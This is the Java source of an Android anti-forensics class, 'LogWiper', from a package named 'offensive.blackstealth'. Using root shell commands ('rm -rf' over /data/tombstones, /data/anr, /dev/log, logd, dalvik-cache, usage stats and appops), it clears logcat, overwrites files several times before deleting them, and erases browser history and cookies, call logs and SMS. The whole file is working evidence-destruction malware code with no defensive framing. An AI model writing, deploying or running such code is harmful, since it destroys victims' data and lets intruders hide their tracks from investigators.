package com.offensive.blackstealth.antiforensics;

import android.content.Context;
import android.util.Log;
import java.io.*;
import java.util.*;

/**
 * Log Wiper
 * Clears system logs and evidence
 */
public class LogWiper {
    private static final String TAG = "LogWiper";
    
    private Context context;
    private List<String> logPaths;
    private List<String> cachePaths;
    
    public LogWiper(Context context) {
        this.context = context;
        initializePaths();
    }
    
    private void initializePaths() {
        logPaths = Arrays.asList(
            "/data/local/tmp",
            "/data/system/dropbox",
            "/data/tombstones",
            "/data/anr",
            "/data/log",
            "/data/misc/logd",
            "/dev/log",
            "/proc/last_kmsg"
        );
        
        cachePaths = Arrays.asList(
            "/data/dalvik-cache",
            "/data/system/usagestats",
            "/data/system/appops.xml",
            "/data/system/recent_tasks"
        );
    }
    
    /**
     * Wipe all logs
     */
    public void wipeAll() {
        wipeSystemLogs();
        wipeAppLogs();
        wipeCache();
        wipeLogcat();
        wipeTombstones();
        wipeANRTraces();
        Log.i(TAG, "All logs wiped");
    }
    
    /**
     * Wipe system logs (requires root)
     */
    public void wipeSystemLogs() {
        for (String path : logPaths) {
            try {
                executeRoot("rm -rf " + path + "/*");
            } catch (Exception e) {}
        }
        Log.i(TAG, "System logs wiped");
    }
    
    /**
     * Wipe app-specific logs
     */
    public void wipeAppLogs() {
        try {
            // Clear app cache
            File cacheDir = context.getCacheDir();
            deleteRecursive(cacheDir);
            
            // Clear app files logs
            File filesDir = context.getFilesDir();
            File[] files = filesDir.listFiles((dir, name) -> 
                name.contains("log") || name.contains(".txt") || name.contains(".csv"));
            if (files != null) {
                for (File f : files) {
                    secureDelete(f);
                }
            }
            
            // Clear shared preferences logs
            File prefsDir = new File(context.getApplicationInfo().dataDir, "shared_prefs");
            if (prefsDir.exists()) {
                File[] prefs = prefsDir.listFiles((dir, name) -> 
                    name.contains("log") || name.contains("history"));
                if (prefs != null) {
                    for (File f : prefs) {
                        f.delete();
                    }
                }
            }
            
        } catch (Exception e) {
            Log.e(TAG, "App log wipe failed: " + e.getMessage());
        }
        Log.i(TAG, "App logs wiped");
    }
    
    /**
     * Clear system cache
     */
    public void wipeCache() {
        try {
            executeRoot("rm -rf /data/dalvik-cache/*");
            executeRoot("rm -rf /cache/*");
            
            for (String path : cachePaths) {
                executeRoot("rm -rf " + path + "/*");
            }
        } catch (Exception e) {}
        Log.i(TAG, "Cache wiped");
    }
    
    /**
     * Clear logcat buffer
     */
    public void wipeLogcat() {
        try {
            Runtime.getRuntime().exec("logcat -c").waitFor();
            Runtime.getRuntime().exec("logcat -b all -c").waitFor();
        } catch (Exception e) {}
        Log.i(TAG, "Logcat wiped");
    }
    
    /**
     * Clear tombstones (crash dumps)
     */
    public void wipeTombstones() {
        try {
            executeRoot("rm -rf /data/tombstones/*");
        } catch (Exception e) {}
        Log.i(TAG, "Tombstones wiped");
    }
    
    /**
     * Clear ANR traces
     */
    public void wipeANRTraces() {
        try {
            executeRoot("rm -rf /data/anr/*");
        } catch (Exception e) {}
        Log.i(TAG, "ANR traces wiped");
    }
    
    /**
     * Wipe specific file securely
     */
    public void secureDelete(File file) {
        if (!file.exists()) return;
        
        try {
            // Overwrite with random data
            long length = file.length();
            RandomAccessFile raf = new RandomAccessFile(file, "rw");
            
            byte[] buffer = new byte[4096];
            Random random = new Random();
            
            // Multiple passes
            for (int pass = 0; pass < 3; pass++) {
                raf.seek(0);
                long remaining = length;
                while (remaining > 0) {
                    random.nextBytes(buffer);
                    int toWrite = (int) Math.min(buffer.length, remaining);
                    raf.write(buffer, 0, toWrite);
                    remaining -= toWrite;
                }
            }
            
            // Final pass with zeros
            raf.seek(0);
            Arrays.fill(buffer, (byte) 0);
            long remaining = length;
            while (remaining > 0) {
                int toWrite = (int) Math.min(buffer.length, remaining);
                raf.write(buffer, 0, toWrite);
                remaining -= toWrite;
            }
            
            raf.close();
            
            // Rename to random name before deletion
            String randomName = UUID.randomUUID().toString();
            File randomFile = new File(file.getParent(), randomName);
            file.renameTo(randomFile);
            randomFile.delete();
            
        } catch (Exception e) {
            // Fallback to simple delete
            file.delete();
        }
    }
    
    /**
     * Clear browser data
     */
    public void wipeBrowserData() {
        List<String> browserPaths = Arrays.asList(
            "/data/data/com.android.browser/databases",
            "/data/data/com.android.browser/cache",
            "/data/data/com.android.chrome/app_chrome/Default/History",
            "/data/data/com.android.chrome/app_chrome/Default/Cookies",
            "/data/data/com.android.chrome/cache"
        );
        
        for (String path : browserPaths) {
            try {
                executeRoot("rm -rf " + path);
            } catch (Exception e) {}
        }
        Log.i(TAG, "Browser data wiped");
    }
    
    /**
     * Clear call logs (requires permissions)
     */
    public void wipeCallLogs() {
        try {
            context.getContentResolver().delete(
                android.provider.CallLog.Calls.CONTENT_URI, null, null);
        } catch (Exception e) {}
        Log.i(TAG, "Call logs wiped");
    }
    
    /**
     * Clear SMS (requires permissions)
     */
    public void wipeSMS() {
        try {
            context.getContentResolver().delete(
                android.net.Uri.parse("content://sms"), null, null);
        } catch (Exception e) {}
        Log.i(TAG, "SMS wiped");
    }
    
    private void deleteRecursive(File dir) {
        if (dir == null || !dir.exists()) return;
        
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    deleteRecursive(file);
                } else {
                    file.delete();
                }
            }
        }
        dir.delete();
    }
    
    private void executeRoot(String command) throws Exception {
        Process su = Runtime.getRuntime().exec("su");
        DataOutputStream os = new DataOutputStream(su.getOutputStream());
        os.writeBytes(command + "\n");
        os.writeBytes("exit\n");
        os.flush();
        su.waitFor();
    }
}
